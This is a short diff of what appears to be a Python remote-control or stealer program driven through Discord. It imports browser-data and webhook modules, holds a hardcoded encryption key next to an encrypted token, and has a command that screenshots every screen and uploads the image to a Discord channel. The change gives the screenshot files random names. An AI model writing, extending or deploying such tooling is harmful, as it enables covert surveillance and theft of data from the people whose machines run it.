@@ -28,6 +28,7 @@ from browser import Browsers
 from _webhook import _WebhookX
 from dhooks import Embed
 from cryptography.fernet import Fernet
+from _random_string import get_random_string
 
 key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
 encrypted_token = b"gAAAAABnpwk0AMR2kHz2wQFHUT-eXyqfugs_Zx7mioRteBu8NDlh5NdPmWv8P7BCM_D6wqaWCRqHh9eCdCgx7k80MFoYw5EkM-nVYrpGmy1B0N6VEgApc_K8g_77bHEQnt6koKuwfHCZXsuD-nIy7HmyaKZjk_C4iy6hDy7LR8XVUZj2_p7ty_Q="
@@ -413,7 +414,8 @@ async def screenshot(ctx, inputid):
             all_screens=True,
             xdisplay=None
         )
-        fname = f'screenshot_{name}.png'
+        randomstring = get_random_string(8)
+        fname = f'screenshot_{randomstring}.png'
         image.save(fname)
         await ctx.send(file=discord.File(fname))
         await ctx.send(f'Screenshot `{fname}` from process {name} was sent.')
